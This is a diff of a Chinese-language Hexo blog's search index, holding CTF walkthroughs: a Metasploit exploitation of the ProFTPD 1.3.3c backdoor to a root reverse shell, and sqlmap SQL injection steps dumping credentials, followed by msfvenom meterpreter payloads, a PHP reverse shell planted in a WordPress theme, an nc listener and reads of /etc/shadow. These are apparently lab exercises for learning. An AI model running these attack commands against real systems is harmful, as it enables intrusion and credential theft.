@@ -1,79 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>FTP服务后门利用</title>
-    <url>/2024/09/11/602e2b077e4b/</url>
-    <content><![CDATA[<h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
-
-<p>发现FTP服务<code>（端口号为21）</code></p>
-<p>记录FTP软件名以及版本号</p>
-<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
-<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
-</blockquote>
-<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
-
-<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png"
-                     
-                ></p>
-<p><strong>我们使用第二种方法</strong></p>
-<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png"
-                      alt="2"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png"
-                      alt="3"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png"
-                      alt="4"
-                ></p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
-
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png"
-                      alt="5"
-                ></p>
-<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
-
-<p>成功获取flag</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>FTP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>AI（Python）学习准备——呕心沥血版</title>
     <url>/2024/09/23/c615d06f1ce9/</url>
     <content><![CDATA[<h1 id="学习准备"><a href="#学习准备" class="headerlink" title="学习准备"></a>学习准备</h1><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><p>本文以下是PyCharm+Anaconda+jupyter的保姆级安装方案，为后面的学习做好准备，如果觉得Anaconda安装太过于麻烦，可以选择一个python版本进行安装和配置环境（详情请自行寻找教程）。</p>
@@ -480,22 +407,180 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2024/09/11/60ab45b83526/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+    <title>sql注入（IP命令行）</title>
+    <url>/2024/09/11/3bc19a255208/</url>
+    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><strong>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</strong></p>
+<p><strong>SQL注入的产生原因通常表现在以下几方面:①不当的类型处理;②不安全的数据库配置;③不合理的查询集处理;④不当的错误处理;⑤转义字符处理不合适;⑥多个提交处理不当。</strong></p>
+<h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1.信息探测"></a>1.信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 IP <span class="comment"># 探测端口</span></span><br><span class="line">namp -T4 -A -v IP <span class="comment"># 探测全部信息</span></span><br><span class="line">nikto -host http://ip:port</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+<h2 id="2-深入挖掘"><a href="#2-深入挖掘" class="headerlink" title="2.深入挖掘"></a>2.深入挖掘</h2><p>打开敏感页面 比如什么登录页面 &#x2F;admin&#x2F;login.php</p>
+<p>尝试弱口令登录，失败</p>
+<h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
+<p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
+</blockquote>
+<p>输入ip进行attack，然后软件开始爬虫并扫描</p>
+<h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
+<p>利用sqlmap利用SQL注入漏洞</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u url # 查看是否具有sql注入</span><br><span class="line">sqlmap -u url --dbs # 查看数据库名</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; --tables # 查看对应数据库中的数据表</span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; --columns # 查看对应字段/列 </span><br><span class="line">sqlmap -u url -D &quot;数据库名&quot; -T &quot;表名&quot; -C &quot;列名&quot; --dump # 查看对应字段的值</span><br><span class="line">sqlmap -u url -os -shell #尝试直接获取shell</span><br><span class="line"># 注：所有的名称可以用 &quot;,&quot; 隔开以获取多个值</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+<p>查找到对应的用户名和密码，登录系统</p>
+<p>上传shell反弹权限</p>
+<p>生成反弹shell</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=攻击机IP lport=未使用的端口 -f raw</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+<p>将生成的shell保存到php文件中</p>
+<p>监听</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 攻击机IP地址 </span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
 
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>然后上传webshell，实现反弹，获取flag</p>
+<h3 id="4-2-未发现高危漏洞"><a href="#4-2-未发现高危漏洞" class="headerlink" title="4.2 未发现高危漏洞"></a>4.2 未发现高危漏洞</h3><p>但是通过前面的信息探测发现了登陆界面 如 &#x2F;phpmyadmin &#x2F;login.php 等</p>
+<p>然后尝试弱口令登录，无法登录，想到利用post sql注入</p>
+<h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>得到用户名和密码</p>
+<p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
+<p><code>/wordpress/wp-login.php</code></p>
+<p>输入用户名和密码，登陆后台。</p>
+<h4 id="4-2-3-反弹shell"><a href="#4-2-3-反弹shell" class="headerlink" title="4.2.3 反弹shell"></a>4.2.3 反弹shell</h4><p>然后也是上传webshell获得控制权</p>
+<p>利用自带的反弹shell</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> php-reverse-shell.php /root/Desktop/</span><br></pre></td></tr></table></figure></div>
+
+<p>然后将复制的shell进行修改，修改端口和ip为&#x3D;&#x3D;攻击机ip&#x3D;&#x3D;</p>
+<p>启动监听</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp port <span class="comment">#对应的端口4444</span></span><br></pre></td></tr></table></figure></div>
+
+<p>访问上传webshell的地址(上传到404页面)</p>
+<p>&#x3D;&#x3D;http:&#x2F;&#x2F;靶场IP:port&#x2F;目录&#x2F;wp-content&#x2F;themes&#x2F;主题名&#x2F;404.php&#x3D;&#x3D;</p>
+<p>成功反弹</p>
+<p>然后优化终端</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="4-2-4-提权"><a href="#4-2-4-提权" class="headerlink" title="4.2.4 提权"></a>4.2.4 提权</h4><p>查看敏感文件</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/shadow </span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure></div>
+
+<p>利用su提权</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">su -root</span><br></pre></td></tr></table></figure></div>
+
+<p>发现空密码无法提权，然后尝试前面获取的密码（和后台密码相同）</p>
+<p>提权成功</p>
+<p>然后到&#x2F;root目录获取flag</p>
+<h2 id="5-X-Forward-For-sql注入"><a href="#5-X-Forward-For-sql注入" class="headerlink" title="5. X-Forward-For sql注入"></a>5. X-Forward-For sql注入</h2><h3 id="5-1-漏洞扫描"><a href="#5-1-漏洞扫描" class="headerlink" title="5.1 漏洞扫描"></a>5.1 漏洞扫描</h3><p>&#x3D;&#x3D;漏洞扫描器 AVWS&#x3D;&#x3D;</p>
+<p>扫描出X-Forwarded-For sql注入</p>
+<h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>成功获取用户名和密码，登录到后台</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>sql</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>FTP服务后门利用</title>
+    <url>/2024/09/11/602e2b077e4b/</url>
+    <content><![CDATA[<h1 id="FTP服务后门利用"><a href="#FTP服务后门利用" class="headerlink" title="FTP服务后门利用"></a>FTP服务后门利用</h1><h2 id="1-信息探测"><a href="#1-信息探测" class="headerlink" title="1. 信息探测"></a>1. 信息探测</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV IP <span class="comment"># 扫描主机服务信息以及服务版本</span></span><br><span class="line">namp -A -v -T4 IP <span class="comment"># 最大线程扫描主机所有信息</span></span><br></pre></td></tr></table></figure></div>
+
+<p>发现FTP服务<code>（端口号为21）</code></p>
+<p>记录FTP软件名以及版本号</p>
+<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h2><h3 id="1-漏洞查找"><a href="#1-漏洞查找" class="headerlink" title="1.漏洞查找"></a>1.漏洞查找</h3><h4 id="1-1SearchSploit”漏洞查找工具"><a href="#1-1SearchSploit”漏洞查找工具" class="headerlink" title="1.1SearchSploit”漏洞查找工具"></a>1.1SearchSploit”漏洞查找工具</h4><blockquote>
+<p>“SearchSploit”是一个用于Exploit-DB的命令行搜索工具(已经默认在Kali中安装)，可以查找渗透模块。Exploit-DB是一个漏洞库，Kali Linux中保存了一个该漏洞库的拷贝，它将搜索所有的漏洞和shellcode而且该漏洞库是保存在本地的，在没有网络的情况下也可以使用。它不会包含任何文件和谷歌黑客数据库的结果。终端输入”searchsploit”启动。</p>
+</blockquote>
+<h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
+
+<p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201710758.png"
+                     
+                ></p>
+<p><strong>我们使用第二种方法</strong></p>
+<h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711103.png"
+                      alt="2"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201711011.png"
+                      alt="3"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712093.png"
+                      alt="4"
+                ></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-image-dunm1e.oss-cn-guangzhou.aliyuncs.com/image/202409201712162.png"
+                      alt="5"
+                ></p>
+<p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="3-获取flag"><a href="#3-获取flag" class="headerlink" title="3.获取flag"></a>3.获取flag</h3><p>一般flag在根目录也就是&#x2F;root中</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root  //进入root目录</span><br><span class="line"><span class="built_in">ls</span>  //查看当前目录（文件夹）中文件列表</span><br><span class="line"><span class="built_in">cat</span> flag  //打开flag文件</span><br></pre></td></tr></table></figure></div>
+
+<p>成功获取flag</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>FTP</tag>
+      </tags>
   </entry>
   <entry>
     <title>ctf 基本思路</title>
@@ -553,9 +638,27 @@
         <category>Web</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
         <tag>common</tag>
+        <tag>CTF</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2024/09/11/60ab45b83526/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
   </entry>
   <entry>
     <title>sql注入（web界面）</title>
@@ -810,106 +913,23 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入（IP命令行）</title>
